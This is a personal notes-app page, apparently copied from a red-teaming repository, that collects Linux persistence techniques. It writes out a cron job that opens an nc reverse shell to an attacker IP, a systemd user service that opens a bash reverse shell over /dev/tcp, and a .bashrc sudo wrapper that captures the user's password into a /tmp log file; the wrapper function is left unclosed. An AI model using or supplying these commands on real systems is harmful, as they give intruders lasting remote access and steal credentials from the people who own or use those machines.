---
creation date: October 22nd 2023
last modified date: October 22nd 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[bash and linux commands]]  
___

## Description:  


## Description:  

https://github.com/RoseSecurity/Red-Teaming-TTPs/blob/main/Linux.md


### One Liner to Add Persistence on a Box via Cron

```
echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
```

On the attack platform: `nc -lvp 1234`

### Systemd User Level Persistence
Place a service file in `~/.config/systemd/user/`

```
vim ~/.config/systemd/user/persistence.service
```

Sample file:

```
[Unit]
Description=Reverse shell[Service]
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9999 0>&1'
Restart=always
RestartSec=60[Install]
WantedBy=default.target
```

Enable service and start service:

```
systemctl --user enable persistence.service
systemctl --user start persistence.service
```

On the next user login systemd will happily start a reverse shell.

### Backdooring Sudo

Add to `.bashrc`

```shell
function sudo() {
    realsudo="$(which sudo)"
    read -s -p "[sudo] password for $USER: " inputPasswd
    printf "\n"; printf '%s\n' "$USER : $inputPasswd\n" >> /tmp/log13999292.log
    $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
    $realsudo "${@:1}"
```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: October 22nd 2023 (12:41 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
